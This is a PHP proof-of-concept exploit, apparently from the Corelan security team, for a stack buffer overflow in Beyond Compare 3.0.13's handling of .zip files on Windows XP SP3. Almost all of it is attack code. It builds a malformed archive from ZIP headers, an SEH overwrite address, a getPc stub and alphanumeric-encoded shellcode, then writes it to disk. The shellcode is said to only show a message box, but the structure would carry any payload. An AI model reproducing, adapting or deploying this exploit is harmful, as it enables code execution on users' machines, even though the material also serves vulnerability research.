<?php
/********************************************************************************
Beyond Compare 3.0.13 b9599 (.zip) 0day Stack Buffer Overflow PoC exploit
Author: mr_me - http://net-ninja.net/
Download: http://es.kioskea.net/remote/download_get.php?ID=2321
Platform: Windows XP sp3
Advisory: http://www.corelan.be:8800/advisories.php?id=10-036
Patched in latest version and previous versions
Greetz to: Corelan Security Team
http://www.corelan.be:8800/index.php/security/corelan-team-members/
Thanks to rick2600 and corelanc0d3r for the getPc !
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Script provided 'as is', without any warranty.
Use for educational purposes only.
Do not use this code to do anything illegal !
  
Note : you are not allowed to edit/modify this code.
If you do, Corelan cannot be held responsible for any damages this may cause.
********************************************************************************/
 
echo "
|------------------------------------------------------------------|
|                         __               __                      |
|   _________  ________  / /___ _____     / /____  ____ _____ ___  |
|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |
| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |
| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |
|                                                                  |
|                                       http://www.corelan.be:8800 |
|                                              security@corelan.be |
|                                                                  |
|-------------------------------------------------[ EIP Hunters ]--|
~> Beyond compare 3.0.13 b9599 (.zip) BOF PoC exploit <~~
";
 
// local file header
$lf_header = "\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE".
"\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x08\x00\x00";
  
// central directory file header
$cdf_header = "\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7".
"\xAC\xCE\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x08".
"\x00\x00\x00\x00\x00\x00\x01\x00\x24\x00\x00\x00\x00\x00\x00\x00";
  
// end of central directory record
$efcdr_record = "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00".
"\x42\x08\x00\x00\x32\x08\x00\x00\x00\x00";
 
// corelan security team - msgbox
$sc = "VYhffffk4diFkDql02Dqm0D1CuEE5n3l0G3j3C0S1p02024B0W3y2G2u4D0k4q3c".
"0615092E0T0H0l4s4u1k0A2p3G0Y3W3A0u2K2J0P2o4E3U2L370w3N5O3h2p1O2w1o3v4".
"T3P4n1K3v4n0z3Y0S0M2k5L4J0m4Y2D103V2s4K4t0Q0U0P7o2L4P2O8K3r0j0y0N0s37".
"2l0m5K0Y8M0S5p4V110Q2J182s7M2K344J3j04VYVTX10X41PZ41H4A4I1TA71TADVTZ3".
"2PZNBFZDQC02DQD0D13DJEON4F1W9M490R0P08654E2M9Y2F64346K5K450115MN2G0N0".
"B0L5C5DKO106737KO9W8P0O2L1L0P184E3U0Q8P1G3L5O9R601E671O9W343QOO113RJO".
"LK8M640M1K3WOL1W4Y2O613V2I4K5C0R0S0PMO2O3W2O8K9R1Z1K0S1H3PLMKM5KKK8M0".
"S4JJL15612J1267KM2K4D903K03VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQ".
"AIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYA".
"ZBABABABAB30APB944JB9K7YMY7Y7O1SKWKQ0X6QLT8Y2TMTJT1K3S7SKT013KLUKS3KL".
"U3QJR1Y04MT4S1Y6L9UKTLX0I1P096TJPML5N0E5K4O6LMP07MW038R9WJT9K0J4M5NOK".
"KKMS3N0L4L8S1N8NLW11JV1V6YKO1SMO1P2OMNKOMK4N8QOO0KKR104POLLZ3XLWJXML6".
"SKN03MQMK0GMQ1ZLZ8K6Y4LKPA";
  
/*
Corelan's - getPc routine
0424F020   EB 05            JMP SHORT 0424F027
0424F022   5E               POP ESI
0424F023   41               INC ECX
0424F024   FFD6             CALL ESI
0424F026   41               INC ECX
0424F027   E8 F6FFFFFF      CALL 0424F022
*/
 
// ascii armoured & mangled
$getPc = "\x89\x05\x5e\x41\x98\x99\x41\x8a\x94\x98\x98\x98";
$sEh = "\x0d\x05\x01\x10"; // add esp, 8; retn --> 7zxa.dll
$trigger = "\x3a";
 
// build the PoC
$junk = str_repeat("\x41", 2064)."\x2e\x74\x78\x74";
$lol = str_repeat("\x41", 223)."\x41\x73\x06\x41".$sEh.$getPc.$sc;
$lol .= str_repeat("\x41",2062-strlen($lol)).$trigger."\x2e\x74\x78\x74";
$_____boooom = $lf_header.$junk.$cdf_header.$lol.$efcdr_record;
file_put_contents("cst-beyondcompare.zip",$_____boooom);
?>
